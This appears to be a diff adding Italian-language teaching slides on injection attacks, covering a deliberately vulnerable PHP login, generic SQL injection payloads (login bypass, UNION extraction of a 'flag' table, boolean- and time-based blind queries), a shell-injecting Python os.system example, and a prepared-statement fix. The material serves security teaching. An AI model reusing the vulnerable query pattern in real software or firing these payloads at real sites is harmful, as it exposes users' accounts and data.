@@ -1,0 +1,115 @@
+<!-- classes: title -->
+
+## Cosa può andare storto? 
+
+Cosa c'è di male in questo esempio?
+
+<!-- fragments-start -->
+```php
+<?php
+$mysqli = new mysqli("localhost","my_user","my_password","my_db");
+
+// Perform query
+$qr = "SELECT * FROM utenti WHERE username='" . $_GET["username"] . "' AND password='" . $_GET["password"] . "'" ;
+$result = $mysqli -> query($qr);
+fai_login($result -> fetch_row()[0]);
+
+$mysqli -> close();
+?>
+```
+
+```sql
+SELECT * FROM utenti WHERE username='gigio' AND password='gigio'
+--  $_GET["username"] = "gigio"; 
+--  $_GET["password"] = "gigio"; 
+```
+```php
+$_GET["username"] = "xxx' or 1=1 LIMIT 0,1 -- -" // Login bypass
+$_GET["username"] = "xxx' UNION SELECT 1,2,3,flag,5 FROM flag -- -" // Accesso ad altre tabelle
+// ... and much more!
+```
+```sql
+SELECT * FROM utenti WHERE username='xxx' or 1=1 LIMIT 0,1 -- -' AND password='gigio'
+SELECT * FROM utenti WHERE username='xxx' UNION SELECT 1,2,3,flag,5 FROM flag -- -' AND password='gigio'
+```
+<!-- fragments-end -->
+
+---
+
+# Le injections
+
+**Non sono una cosa esclusiva di SQL!!!** Possono capitare in **QUALSIASI** interazione tra un linguaggio e l'altro, in generale non fidarsi mai dell'input utente!
+
+Un esempio
+
+```python
+import os
+
+input_utente = input("Cosa vuoi che ti stampi?")
+os.system("echo " + input_utente)
+```
+
+---
+
+## Come difendersi dalle injection?
+
+- Escaping dei caratteri cattivi, sostituendo ad esempo `'` con `\'`
+- Whitelist o blacklist dei caratteri (meglio la prima)
+- Con mysqli, si possono usare i prepared statement (modo migliore)
+
+---
+
+## I prepared statements con mysqli
+
+```php
+<?php
+$mysqli = new mysqli("localhost","my_user","my_password","my_db");
+
+// Perform query
+$qr = "SELECT * FROM utenti WHERE username=? AND password=?" ;
+$stmt = $mysqli->prepare($qr);
+
+// tipo valori, valore, valore
+$stmt->bind_param("ss", $_GET["username"], $_GET["password"]);
+
+$stmt->execute();
+$result = $stmt->get_result(); // get the mysqli result
+
+fai_login($result->fetch_assoc());
+
+$mysqli -> close();
+?>
+```
+
+---
+
+## Tipi di SQL injections
+
+- UNION Based (come abbiamo visto)
+- Boolean Based
+- Time Based
+
+---
+
+## Boolean Based
+
+Si usano quando ciò che viene preso con la query non viene stampato, ma in qualche modo sappiamo dire se la query ritornata è vuota o meno
+
+<!-- classes: bigquery -->
+```sql
+SELECT nome FROM utenti WHERE email='NOSTROINPUT'
+SELECT nome FROM utenti WHERE email='pippo@disneyland.it' AND 1=(SELECT 1 FROM utenti WHERE id=1 AND password LIKE 'topol%')-- -'
+```
+---
+
+## Time Based
+
+Si usano quando ciò che viene preso con la query non viene stampato e non abbiamo modo di capire se il risultato è vuoto o mettono.
+
+Si usa `SLEEP(SECONDI)` su MySQL e `randomblob(100000000)` su SQLite3
+
+<!-- classes: bigquery -->
+```sql
+SELECT nome FROM utenti WHERE email='NOSTROINPUT'
+SELECT nome FROM utenti WHERE email='pippo@disneyland.it' AND 1=(SELECT 1 FROM utenti WHERE password LIKE 'topol%') AND 1=randomblob(100000000)-- -'
+```
